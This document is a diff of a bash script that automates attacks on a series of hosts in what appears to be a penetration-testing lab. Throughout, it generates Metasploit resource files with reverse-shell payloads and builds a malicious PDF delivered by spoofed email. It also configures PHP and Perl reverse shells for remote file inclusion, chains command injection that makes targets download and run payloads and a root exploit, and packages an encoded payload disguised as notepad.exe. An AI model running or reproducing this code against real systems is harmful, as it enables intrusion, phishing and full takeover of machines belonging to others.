+    (makeXtermLog "Oracle-Exploitation" "$msfc -r $msfs/oracle$toctet$loctet.rc" &) >/dev/null
   }
   oracleExploit;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Oracle Exploitation"
-  checkthebrakesBot;
+  echoStatement "Finished Oracle Exploitation"
 }
 ################################################################################
 #~~~~~~~~~~~~~~~~> PEDRO CONFIGURATION AND EXPLOITATION SECTION <~~~~~~~~~~~~~~~~#
@@ -840,9 +1187,7 @@ PedroSanchez() {
   pedroJohn() {
     if [ "`john --format=hmailserver 2>&1 | cut -d" " -f1`" != "Password" ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] The JTR installed on your system DOES NOT support hmailserver formats"
-        checkthebrakesBot;
+        echoStatement "The JTR installed on your system DOES NOT support hmailserver formats"
     fi;
   }
   pedroJohn;
@@ -850,58 +1195,48 @@ PedroSanchez() {
     # make the directory to store the pdf's in
     if [ ! -d $msfs/pedro ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Dir: $msfs/pedro"
-        checkthebrakesBot;
+        echoStatement "Producing Dir: $msfs/pedro"
         mkdir $msfs/pedro
     fi
     # produce the recourse files for msf pdf creation
-    if [ ! -f $msfs/pedro/pedro$toctet.rc" ];
+    if [ ! -f $msfs/pedro/pedro$toctet$loctet.rc ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/pedro/pedro$toctet.rc"
-        checkthebrakesBot;
-        echo "use $pedroExploit" > $msfs/pedro$toctet/pedro$toctet.rc
-        echo "set FILENAME $msfs/pedro$toctet/pedro$toctetreport.pdf" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "set lhost $AttackerIP" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "set lport $lp" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "set payload $pay" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "set $DPH" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "exploit" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "sleep 25" >> $msfs/pedro$toctet/pedro$toctet.rc
-        echo "exit" >> $msfs/pedro$toctet/pedro$toctet.rc
+        echoStatement "Producing file: $msfs/pedro/pedro$toctet$loctet.rc"
+        echo "use $pedroExploit" > $msfs/pedro/pedro$toctet$loctet.rc
+        echo "set FILENAME pedro$toctet.$loctet.report.pdf" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "set lhost $AttackerIP" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "set lport $lp" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "set payload $winmetrev" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "set $DPH" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "exploit" >> $msfs/pedro/pedro$toctet$loctet.rc
+        echo "exit" >> $msfs/pedro/pedro$toctet$loctet.rc
     fi;
   }
-  perdroRC;
+  perdoRC;
   # make the emails to send to pedro spoofed from jeff
   makeEvilPDF() {
-    if [ ! -f $msfs/pedro/report$toctet.pdf ]; 
+    if [ ! -f $msfs/pedro/report$toctet.$loctet.report.pdf ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/pedro/report$toctet.pdf"
-        checkthebrakesBot;    
-        (makeXtermLog "Pedro-Spoofed-Email" "$msfc -r $msfs/pedro$toctet/pedro$toctet.rc" &) >/dev/null
+        echoStatement "Producing file: $msfs/pedro/report$toctet.pdf"
+        (makeXtermLog "Pedro-Spoofed-Email" "$msfc -r $msfs/pedro/pedro$toctet$loctet.rc") >/dev/null
     fi;
   }
   makeEvilPDF;
-  makeFakeEmail() {
-    checkthebrakesTop;
-    echo -e "\t[*] Staging fake eMail with file: $msfs/pedro/report$toctet.pdf"
-    checkthebrakesBot;  
+  sendFakeEmail() {
+    cp /root/.msf4/local/pedro$toctet.$loctet.report.pdf $msfs/pedro
+    echoStatement "Staging fake eMail with file: $msfs/pedro/report$toctet.pdf"
     (makeXtermLog "Pedro-Spoofed-Email" "sendEmail \
-          -s 10.10.11.229 \
+          -s $uip \
           -xu jeff@thinc.local \
           -xp password \
           -f jeff@thinc.local \
           -t pedro@thinc.local \
           -u report \
-          -m 'It is not meterpreter I swear....' \
-          -a $msfs/pedro$toctet/report$toctet.pdf" &) >/dev/null
+          -m "It is not `echo -e \"\x6e\x6f\x31\x73\x70\x65\x63\x69\x61\x6c\"` I swear ...." \
+          -a $msfs/pedro/pedro$toctet.$loctet.report.pdf" &) >/dev/null
   }
-  makeFakeEmail;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Exploiting Pedro"
-  checkthebrakesBot; 
+  sendFakeEmail;
+  echoStatement "Finished Exploiting Pedro, Wait for Multi-Handler Shell"
 }
 #
 ################################################################################
@@ -910,73 +1245,52 @@ PedroSanchez() {
 #
 # start Phoenix
 RiseofthePhoenix() {
-  PhoneixCheck() {
-    # make phoenix dir and web dir for shell
+  PhoDir() { `# make phoenix dir and web dir for shell`
     if [ ! -d $msfs/phoenix ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Dir: $msfs/phoenix "
-        checkthebrakesBot;
+        echoStatement "Producing Dir: $msfs/phoenix "
         mkdir $msfs/phoenix
     fi;
     if [ ! -d $webdir/phoenix/ ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Dir: $webdir/phoenix "
-        checkthebrakesBot;
+        echoStatement "Producing Dir: $webdir/phoenix "
         mkdir $webdir/phoenix/
      fi;
-  }
-  PhoenixCheck;
+  }    
+  PhoDir;
   checkmonkey;
   makePhoenixPHP() {
     #makes the reverse shell php for phoenix
-    if [ ! -f $msfs/pedro/phoenix$toctet.php ]; 
+    if [ ! -f $msfs/phoenix/phoenix$toctet$loctet.php ]; 
        then
-         checkthebrakesTop;
-         echo -e "\t[*] Producing file: $msfs/pedro/phoenix$toctet.php "
-         checkthebrakesBot;
+         echoStatement "Producing file: $msfs/phoenix/phoenix$toctet$loctet.php "
          cat $msfs/php-reverse-shell-1.0/php-reverse-shell.php |\
            sed -r "s/(ip = )(.*)/\1'$AttackerIP';/g" |\
-           sed -r "s/(port = )(.*)/\1 80;/g" > $msfs/phoenix/phoenix$toctet.php
-         cp $msfs/phoenix/phoenix$toctet.php $webdir/phoenix/phoenix$toctet.php
+           sed -r "s/(port = )(.*)/\1 6341;/g" |\
+           sed -r "s/\/\/(.*)//g" |\
+           grep -Ev "^$" |\
+           sed -r "/^\t$/"d |\
+           sed -r "s/<\?php/<\?php\n\/\/ `echo $newdes`/g" |\
+           sed -r "s/(shell = ')(.*)/\1echo `echo $newdes` > `echo $newdes` 2>\/dev\/null\; \2/g" > $msfs/phoenix/phoenix$toctet$loctet.php
+         cp $msfs/phoenix/phoenix$toctet$loctet.php $webdir/phoenix/phoenix$toctet$loctet.php
+         echoStatement "Patching Exploit to land in Metasploit Multi-Handler"
     fi;
   }
   makePhoenixPHP;
   PhoenixExploit() {
-    checkthebrakesTop;
-    echo -e "\t[*] Prepairing to exploit Phoenix "
-    checkthebrakesBot;
-    systemctl stop apache2
-    a2enmod php7.0
-    systemctl start apache2
-    sleep 5
-    checkthebrakesTop;
-    echo -e "\t[*] Phoenix Exploitation Stage1 NC Listener "
-    checkthebrakesBot;
-    (makeXtermLog "Phoenix-Exploitation" "nc -l -v -p 80" &) >/dev/null
-    sleep 5
-    checkthebrakesTop;
-    echo -e "\t[*] Phoenix Exploitation Stage2 wget request "
-    checkthebrakesBot;
-    (makeXtermLog "Phoenix-Exploitation-Stage2" "wget http://10.10.11.208/internal/advanced_comment_system/index.php?ACS_path=http://$AttackerIP/phoenix/phoenix$toctet.php? && \
-       rm ./index.php\?ACS_path\=http\:%2F%2F$AttackerIP%2Fphoenix%2Fphoenix$toctet.php" &) >/dev/null
-    sleep 10
-    checkthebrakesTop;
-    echo -e "\t[*] Killing Phoenix Exploitation Stages "
-    checkthebrakesBot;
-    killall -9 wget
-    ps -A xf |\
-      grep "nc -l -v -p 8080" |\
-      grep -v grep |\
-      tr -s " " |\
-      cut -d" " -f2 |\
-      xargs kill -9
+    echoStatement "Prepairing to exploit Phoenix "
+    if [ "checkapache" == "apache2" ]; 
+      then 
+        stopdisablephprestart
+      else 
+        disablephprestart
+    fi
+    echoStatement "Phoenix Exploitation Stage1 wget request "
+    (makeXtermLog "Phoenix-Exploitation-Stage1" "wget -t1 -T20 http://$uip/internal/advanced_comment_system/index.php?ACS_path=http://$AttackerIP/phoenix/phoenix$toctet$loctet.php? && \
+       rm ./index.php\?ACS_path\=http\:%2F%2F$AttackerIP%2Fphoenix%2Fphoenix$toctet$loctet.php" &) >/dev/null
   }
   PhoenixExploit;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Phoenix Exploitation "
-  checkthebrakesBot;
+  echoStatement "Finished Phoenix Exploitation "
 }
 #
 ################################################################################
@@ -989,32 +1303,30 @@ CactiSpine() {
     # make cacti dir for storage
     if [ ! -d $webdir/cacti/ ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing Dir: $webdir/cacti "
-        checkthebrakesBot;
+        echoStatement "Producing Dir: $webdir/cacti "
         mkdir $webdir/cacti/
     fi;
   }
   cactiStore;
   cactiWebShell() {
     # produce web shell to get root 
-    if [ ! -f $webdir/cacti/cacti$toctetmsf ];
+    if [ ! -f $webdir/cacti/cacti$toctet$loctet.msf ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $webdir/cacti/cacti$toctetmsf "
-        checkthebrakesBot;
-        msfvenom -p $lrs LHOST=$AttackerIP LPORT=8080 X > $webdir/cacti/cacti$toctetmsf
+        echoStatement "Producing file: `echo $webdir`/cacti/cacti`echo $toctet$loctet`.msf "
+        ($msfv -p $linmetrev LHOST=$AttackerIP LPORT=1889 X > $webdir/cacti/cacti$toctet$loctet.msf) 2>/dev/null
     fi;
   }
-  cactiWebShell;
+  (cactiWebShell);
   cactiLocalExploit() {
     # produce local root exploit to web dir
-    if [ ! -f $webdir/cacti/cactiroot$toctet.sh ]; 
+    if [ ! -f $webdir/cacti/cactiroot$toctet$loctet.sh ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $webdir/cacti/cactiroot$toctet.sh "
-        checkthebrakesBot;
-        cp /usr/share/exploitdb/platforms/linux/local/2011.sh $webdir/cacti/cactiroot$toctet.sh
+        echoStatement "Producing file: $webdir/cacti/cactiroot$toctet$loctet.sh "
+        cp /usr/share/exploitdb/platforms/linux/local/2011.sh $webdir/cacti/cactiroot$toctet$loctet.shtmp
+        cat $webdir/cacti/cactiroot$toctet$loctet.shtmp `# cat file for processing` |\
+          sed -r "s/# (.*)//g" `# remove all comments from bash script`|\
+          sed "2s/.*/\# `echo $newdes`/g" `# add new descriptor`|\
+          grep -Ev "^$" > $webdir/cacti/cactiroot$toctet$loctet.sh `# output bash script to disk`
     fi;
   }
   cactiLocalExploit;
@@ -1022,59 +1334,40 @@ CactiSpine() {
   checkCactiServices() {
     if [ "`netstat -antelop | tr -s " " | grep "apache" | cut -d" " -f6`" == "LISTEN" ]; 
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Stopping services inn order to exploit Cacti "
-        checkthebrakesBot;
-        systemctl stop apache2
-        a2enmod php7.0
-        systemctl start apache2
+        echoStatement "Stop-Restart, disable PHP, restart Apache in order to exploit Cacti "
+        stopdisablephprestart
       else
-        checkthebrakesTop;
-        echo -e "\t[*] Stopping services inn order to exploit Cacti "
-        checkthebrakesBot;
-        a2enmod php7.0
-        systemctl start apache2
+        echoStatement "Disable PHP, Start Apache in order to exploit Cacti "
+        disablephprestart
     fi;
   }
   checkCactiServices;
   AttackonCacti() {
     # start attack on cacti
-    checkthebrakesTop;
-    echo -e "\t[*] Stopping services in order to exploit Cacti "
-    checkthebrakesBot;
-    checkthebrakesTop;
-    echo -e "\t[*] Starting Cacti Exploition Phase1 "
-    checkthebrakesBot;    
-    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase1" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ wget http://$AttackerIP/cacti/cacti$toctetmsf -O /tmp/cacti$toctetmsf && \
-              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ wget http://$AttackIP/cacti/nc -O /tmp/nc && \
-              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ chmod 755 /tmp/nc && \
-              php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ chmod 755 /tmp/cacti$toctetmsf" &) >/dev/null
-    checkthebrakesTop;
-    echo -e "\t[*] Starting Cacti Exploition Phase2 "
-    checkthebrakesBot;   
-    (makeXtermLog "Cacti-WebShell-Phase2" "echo -e "wget http://$AttackerIP/cacti/cactiroot$toctet.sh -O /tmp/cactiroot$toctet.sh";
+    echoStatement "Starting Cacti Exploition Phase1 "
+    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase1" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ wget http://$AttackerIP/cacti/cacti$toctet$loctet.msf -O /tmp/cacti$toctet$loctet.msf && \
+              php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ wget http://$AttackIP/cacti/nc -O /tmp/nc && \
+              php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ chmod 755 /tmp/nc && \
+              php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ chmod 755 /tmp/cacti$toctet$loctet.msf" &) >/dev/null
+    echoStatement "Starting Cacti Exploition Phase2 "
+    (makeXtermLog "Cacti-WebShell-Phase2" "echo -e \"wget http://$AttackerIP/cacti/cactiroot$toctet$loctet.sh -O \
+              /tmp/cactiroot$toctet$loctet.sh;
               sleep 5;
-              chmod 755 /tmp/cactiroot$toctet.sh;
-              /tmp/cactiroot$toctet.sh" | nc -lvp 8080" &) >/dev/null
+              chmod 755 /tmp/cactiroot$toctet$loctet.sh;
+              /tmp/cactiroot$toctet$loctet.sh\" | nc -lvp 8080" &) >/dev/null
     sleep 30
-    checkthebrakesTop;
-    echo -e "\t[*] Starting Cacti Exploition Phase3 "
-    checkthebrakesBot;   
-    (makeXtermLog "Cacti PHP CMD Injection-Phase3" "/pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ /tmp/cacti$toctetmsf &
-    echo -e "\n\n\t\t[*] Taking a 300 second nap...." 
+    echoStatement "Starting Cacti Exploition Phase3 "
+    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase3" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ /tmp/cacti$toctet$loctet.msf" &)
+    echoStatement "Taking a 300 second nap...." 
     sleep 300s
-    checkthebrakesTop;
-    echo -e "\t[*] Starting Cacti Exploition Phase4 "
-    checkthebrakesBot;   
-    (makeXtermLog "Cacti-root-user-info-Phase4" "echo -e "whoami\nifconfig" | nc -lvp 8081 &) >/dev/null
-    checkthebrakesTop;
-    echo -e "\t[*] Starting Cacti Exploition Phase5 "
-    checkthebrakesBot;
-    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase5" "php /pentest/exploits/exploitdb/platforms/php/webapps/3029.php $uip  /cacti/ /tmp/nc $AttackIP 8081 -e /tmp/s &) >/dev/null
+    echoStatement "Starting Cacti Exploition Phase4 "
+    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase4" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ /tmp/nc $AttackIP 8080" &) >/dev/null
+    echoStatement "Starting Cacti Exploition Phase5 "
+    (makeXtermLog "Cacti-root-user-info-Phase5" "echo -e \"whoami\nifconfig\" | nc -lvp 8081" &) >/dev/null
+    echoStatement "Starting Cacti Exploition Phase6 "
+    (makeXtermLog "Cacti-PHP-CMD-Injection-Phase6" "php /usr/share/exploitdb/platforms/php/webapps/3029.php $uip /cacti/ /tmp/nc $AttackIP 8081 -e /tmp/s" &) >/dev/null
     sleep 120s
-    checkthebrakesTop;
-    echo -e "\t[*] Cleaning-up the Cacti Exploition Phases "
-    checkthebrakesBot;
+    echoStatement "Cleaning-up the Cacti Exploition Phases "
     ps -A xf |\
       grep  "nc -lvp 8080" |\
       grep xterm |\
@@ -1089,9 +1382,7 @@ CactiSpine() {
       xargs kill -9
   }
   AttackonCacti;
- checkthebrakesTop;
- echo -e "\t[*] Finished the Cacti Exploition "
- checkthebrakesBot;
+  echoStatement "Finished the Cacti Exploition "
 }
 #
 ################################################################################
@@ -1100,14 +1391,17 @@ CactiSpine() {
 #
 # start trixbox root shell from SOME 0day 
 SillyRabbit() {
+  patchexploit() {
+  cat /usr/share/exploitdb/platforms/linux/remote/6045.py |\
+    sed -r "s/sudo \/bin\/bash 0/echo \"`echo $newdes`\" > `echo $newdes`; sudo \/bin\/bash 0/g" |\
+    sed -r "s/Host\: 192\.168\.219\.132/Host\: $uip/g" > 6045tmp.py;
+  mv 6045tmp.py /usr/share/exploitdb/platforms/linux/remote/6045.py
+  }
+  patchexploit;
   # start trixbox exploitation
-  checkthebrakesTop;
-  echo -e "\t[*] Starting the TrixBoox NC listener "
-  checkthebrakesBot;
+  echoStatement "Starting the TrixBoox NC listener ";
   (makeXtermLog "TrixBox-Root-Shell" "nc -lvp 8082 &") >/dev/null
-  checkthebrakesTop;
-  echo -e "\t[*] Starting the TrixBoox Exploitation process "
-  checkthebrakesBot;
+  echoStatement "Starting the TrixBoox Exploitation process "
   (makeXtermLog "TrixBox-Exploitation" "python /usr/share/exploitdb/platforms/linux/remote/6045.py $uip 80 $AttackerIP 8082 &) >/dev/null
   cleantheBowl() {
     ps -A xf |\
@@ -1119,7 +1413,7 @@ SillyRabbit() {
   }
   cleantheBowl;
   checkthebrakesTop;
-  echo -e "\t[*] Finished the TrixBoox Exploitation process "
+  echo -e "\t[*] Finished the TrixBox Exploitation process "
   checkthebrakesBot;
 }
 #
@@ -1159,13 +1453,49 @@ MSFPRO2;
 #
 # start Redhat SMB exploit
 RedHatHaXoR() {
-  checkthebrakesTop;
-  echo -e "\t[*] Starting the RedHat SMB Exploitation process "
-  checkthebrakesBot;
-  (makeXtermLog "RedHat-SMB-2.2" "perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H $AttackerIP -h $uip" &) > /dev/null
-  checkthebrakesTop;
-  echo -e "\t[*] Finished the RedHat SMB  Exploitation process "
-  checkthebrakesBot;
+  # make the directory to store the config files in
+  if [ ! -d $msfs/redhatt2 ];
+    then
+      echoStatement "Producing Dir: $msfs/redhatt2"
+      mkdir $msfs/redhatt2
+  fi;
+  echoStatement "Please choose which exploit you wish to use\n\t\tSelect Metasploit or Perl"
+  read whichexploit
+  if [ "echo $whichexploit | tr '[:upper:]' '[:lower:]'" == "perl" ];
+    then
+      patchexploit() {
+      cat /usr/share/exploitdb/platforms/linux/remote/7.pl |\
+      sed -r "s/###############/# `echo $newdes`/g" > 7.pltmp;
+      mv 7.pltmp /usr/share/exploitdb/platforms/linux/remote/7.pl
+      rm 7.pltmp 2>/dev/null
+      }
+      (patchexploit);
+      echoStatement "Starting the RedHat SMB Exploitation process with Perl Exploit"
+      (makeXtermLog "RedHat-SMB-2.2" "perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H $AttackerIP -h $uip" &) > /dev/null
+    else
+      RHRC() {
+        # produce the recourse files for redhat trans2open creation
+        if [ ! -f "$msfs/redhattt2/redhatt2$toctet$loctet.rc" ];
+          then
+           echoStatement "Producing file: $msfs/redhatt2/redhatt2$toctet$loctet.rc"
+           echo -e "use $redhatt2Exploit" > $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "set RHOST $uip" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "set LHOST $AttackerIP" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "set LPORT 1889" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "set PAYLOAD $linmetrev" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "set $DPH" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "exploit -j -z" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "sleep 25" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echo -e "exit" >> $msfs/redhatt2/redhatt2$toctet$loctet.rc
+           echoStatement "Starting the RedHat SMB Exploitation process with Metasploit Exploit"
+          (makeXtermLog "RedHat-SMB-2.2-MSF" "$msfc -r $msfs/redhatt2/redhatt2$toctet$loctet.rc" &) > /dev/null
+         else
+           echoStatement "Starting the RedHat SMB Exploitation process with Metasploit Exploit"
+          (makeXtermLog "RedHat-SMB-2.2-MSF" "$msfc -r $msfs/redhatt2/redhatt2$toctet$loctet.rc" &) > /dev/null
+        fi;
+      }
+      (RHRC);
+  echoStatemnt "Finished the RedHat SMB Exploitation process "
 }
 #
 ################################################################################
@@ -1184,19 +1514,17 @@ RedHatHaXin9() {
         echo "use $rh9Exploit" > $msfs/redhat9$toctet.rc
         echo "set rhost $uip" >> $msfs/redhat9$toctet.rc
         echo "set lhost $AttackerIP" >> $msfs/redhat9$toctet.rc
-        echo "set lport $lp" >> $msfs/redhat9$toctet.rc
-        echo "set payload $lmr" >> $msfs/redhat9$toctet.rc
+        echo "set lport 1889" >> $msfs/redhat9$toctet.rc
+        echo "set payload $linmetrev" >> $msfs/redhat9$toctet.rc
         echo "set $DPH" >> $msfs/redhat9$toctet.rc
         echo "exploit" >> $msfs/redhat9$toctet.rc
         echo "exit" >> $msfs/redhat9$toctet.rc
-    fi
+    fi;
   }
   makeRH9RC;
   RH9Exploit() {
     # start the exploitation process for redhat9
-    checkthebrakesTop;
-    echo -e "\t[*] Starting RedHat9 Exploitation process "
-    checkthebrakesBot;  
+    echoStatement "Starting RedHat9 Exploitation process "
     (makeXtermLog "Redhat-9-Exploitation" "$msfc -r $msfs/redhat9$toctet.rc" &) >/dev/null
   }
   RH9Exploit;
@@ -1210,33 +1538,27 @@ RedHatHaXin9() {
 MasterAttack() {
   masterRC() {
     # start master recourse file creation
-    if [ ! -f  $msfs/master$toctet.rc ];
+    if [ ! -f  $msfs/master$toctet$loctet.rc ];
       then
-        checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/master$toctet.rc "
-        checkthebrakesBot; 
-        echo -e "use $masterExploit" > $msfs/master$toctet.rc
-        echo -e "set rhost $uip">> $msfs/master$toctet.rc
-        echo -e "set lhost $AttackerIP">> $msfs/master$toctet.rc
-        echo -e "set lport $lp">> $msfs/master$toctet.rc
-        echo -e "set payload $pay">> $msfs/master$toctet.rc
-        echo -e "set $DPH">> $msfs/master$toctet.rc
-        echo -e "exploit">> $msfs/master$toctet.rc
-        echo -e "exit" >> $msfs/master$toctet.rc
+        echoStatement "Producing file: $msfs/master$toctet$loctet.rc "
+        echo -e "use $masterExploit" > $msfs/master$toctet$loctet.rc
+        echo -e "set rhost $uip" >> $msfs/master$toctet$loctet.rc
+        echo -e "set lhost $AttackerIP" >> $msfs/master$toctet$loctet.rc
+        echo -e "set lport $lp" >> $msfs/master$toctet$loctet.rc
+        echo -e "set payload $winmetrev" >> $msfs/master$toctet$loctet.rc
+        echo -e "set $DPH" >> $msfs/master$toctet$loctet.rc
+        echo -e "exploit" >> $msfs/master$toctet$loctet.rc
+        echo -e "exit" >> $msfs/master$toctet$loctet.rc
     fi;
   }
   masterRC;
   MasterExploiter() {
     # start master exploitation process
-    checkthebrakesTop;
-    echo -e "\t[*] Starting the Exploitation of Master "
-    checkthebrakesBot;
-    (makeXtermLog "Master-Exploitation" "$msfc -r $msfs/master$toctet.rc" &) >/dev/null
+    echoStatement "Starting the Exploitation of Master "
+    (makeXtermLog "Master-Exploitation" "$msfc -r $msfs/master$toctet$loctet.rc" &) >/dev/null
   }
   MasterExploiter;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Exploitation of Master "
-  checkthebrakesBot; 
+  echoStatement "Finished Exploitation of Master "
 } 
 #
 ################################################################################
@@ -1244,35 +1566,31 @@ MasterAttack() {
 ################################################################################
 #
 # start slave 
-SexSlave() {
+SlaveAttack() {
   slaveRC() {
-    if [ ! -f  $msfs/slave$toctet.rc ];
+    if [ ! -f  $msfs/slave$toctet$loctet.rc ];
       then
         checkthebrakesTop;
-        echo -e "\t[*] Producing file: $msfs/slave$toctet.rc "
+        echo -e "\t[*] Producing file: $msfs/slave$toctet$loctet.rc "
         checkthebrakesBot; 
-        echo "use slaveExploit" > $msfs/slave$toctet.rc
-        echo "set rhost $uip" >> $msfs/slave$toctet.rc
-        echo "set lhost $AttackerIP" >> $msfs/slave$toctet.rc
-        echo "set lport $lp" >> $msfs/slave$toctet.rc
-        echo "set payload $pay" >> $msfs/slave$toctet.rc
-        echo "set $DPH" >> $msfs/slave$toctet.rc
-        echo "exploit" >> $msfs/slave$toctet.rc
-        echo "exit" >> $msfs/slave$toctet.rc
+        echo "use $slaveExploit" > $msfs/slave$toctet$loctet.rc
+        echo "set rhost $uip" >> $msfs/slave$toctet$loctet.rc
+        echo "set lhost $AttackerIP" >> $msfs/slave$toctet$loctet.rc
+        echo "set lport $lp" >> $msfs/slave$toctet$loctet.rc
+        echo "set payload $winmetrev" >> $msfs/slave$toctet$loctet.rc
+        echo "set $DPH" >> $msfs/slave$toctet$loctet.rc
+        echo "exploit" >> $msfs/slave$toctet$loctet.rc
+        echo "exit" >> $msfs/slave$toctet$loctet.rc
     fi;
   }
   slaveRC;
-  slaveExploit() {
+  ExploitSlave() {
     # start slave exploitation process
-    checkthebrakesTop;
-    echo -e "\t[*] Starting the Exploitation of Slave "
-    checkthebrakesBot;
+    echoStatement "Starting the Exploitation of Slave "
     (maskeXtermLog "Salve-Exploitation" "$msfc -r $msfs/master$toctet.rc" &) >/dev/null
   }
-  slaveExploit;
-  checkthebrakesTop;
-  echo -e "\t[*] Finished Exploitation of Slave "
-  checkthebrakesBot; 
+  ExploitSlave;
+  echoStatement "Finished Exploitation of Slave "
 }
 #
 ################################################################################
@@ -1318,7 +1636,7 @@ djJazzy() {
         checkthebrakesTop;
         echo -e "\t[*] Producing file: $webdir/jeff/notepad$toctet.exe "
         checkthebrakesBot;
-        $msfv -p $pay LHOST=$AttackerIP LPORT=$lp R \
+        $msfv -p $winmetrev LHOST=$AttackerIP LPORT=$lp R \
         -e x86/shikata_ga_nai -c 2 \
         -t exe -o $webdir/jeff/notepad$toctet.exe
     fi;
@@ -1483,7 +1801,7 @@ WebSQL() {
         echo "set lhost $AttackerIP" >> $msfs/SQLsrv$toctet.rc
         echo "set $DPH" >> $msfs/SQLsrv$toctet.rc
         echo "set lport $lp" >> $msfs/SQLsrv$toctet.rc
-        echo "set payload $pay" >> $msfs/SQLsrv$toctet.rc
+        echo "set payload $winmetrev" >> $msfs/SQLsrv$toctet.rc
         echo "exploit" >> $msfs/SQLsrv$toctet.rc
         echo "exit" >> $msfs/SQLsrv$toctet.rc
     fi;
@@ -1518,7 +1836,7 @@ ThinMail() {
         echo "set RHOST $uip" >> $msfs/thinmail$toctet.rc
         echo "set LHOST $AttackerIP" >> $msfs/thinmail$toctet.rc
         echo "set LPORT $lp" >> $msfs/thinmail$toctet.rc
-        echo "set PAYLOAD $pay" >> $msfs/thinmail$toctet.rc
+        echo "set PAYLOAD $winmetrev" >> $msfs/thinmail$toctet.rc
         echo "set $DPH" >> $msfs/thinmail$toctet.rc
         echo "exploit" >> $msfs/thinmail$toctet.rc
         echo "exit" >> $msfs/thinmail$toctet.rc
@@ -2089,23 +2407,7 @@ fc4me() {
     fi;
   }
   fc4webdir;
-  fc4perlshell() {
-    # fc4 perl reverse shell
-    if [ ! -f $webdir/fc4/perl-reverse-shell-1.0.tar.gz ];
-      then
-        checkthebrakesTop;
-        echo -e "\t[*] Downloading Pentest Money Perl Shell "
-        checkthebrakesBot;
-        wget http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz -O $webdir/fc4/perl-reverse-shell-1.0.tar.gz
-        cd $webdir/fc4/;
-        checkthebrakesTop;
-        echo -e "\t[*] Expanding $webdir/fc4/perl-reverse-shell-1.0.tar.gz"
-        checkthebrakesBot;
-        tar -zxvf perl-reverse-shell-1.0.tar.gz
-        cd ~
-    fi;
-  }
-  fc4perlshell;
+  (checkmonkey);
   fc4perl2cgi() {
     # fc4 perl to cgi shell file for testing
     if [ ! -f $webdir/fc4/fc4$toctet.cgi ];
@@ -2113,9 +2415,9 @@ fc4me() {
         checkthebrakesTop;
         echo -e "\t[*] Producing file: $webdir/fc4/fc4$toctet.cgi "
         checkthebrakesBot;
-        cat $webdir/fc4/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
+        cat $msfs/perl-reverse-shell-1.0/perl-reverse-shell.pl |\
           sed -r "s/ip \= '127.0.0.1'\;/ip \= '$AttackerIP'\;/g" |\
-          sed -r "s/port \= 1234\;/port \= 4321\;/g" > $webdir/fc4/fc4$toctet.cgi
+          sed -r "s/port \= 1234\;/port \= 6341\;/g" > $webdir/fc4/fc4$toctet.cgi
     fi;
   }
   fc4perl2cgi;
@@ -2248,7 +2550,7 @@ helpdesk() {
         echo -e "set rhost $uip" >> $msfs/helpdesk$toctet.rc
         echo -e "set lhost $AttackerIP" >> $msfs/helpdesk$toctet.rc
         echo -e "set lport $lp" >> $msfs/helpdesk$toctet.rc
-        echo -e "set payload $pay" >> $msfs/helpdesk$toctet.rc
+        echo -e "set payload $winmetrev" >> $msfs/helpdesk$toctet.rc
         echo -e "set $DPH" >> $msfs/helpdesk$toctet.rc
         echo -e "exploit" >> $msfs/helpdesk$toctet.rc
         echo -e "exit" >> $msfs/helpdesk$toctet.rc
@@ -2297,7 +2599,7 @@ cory() {
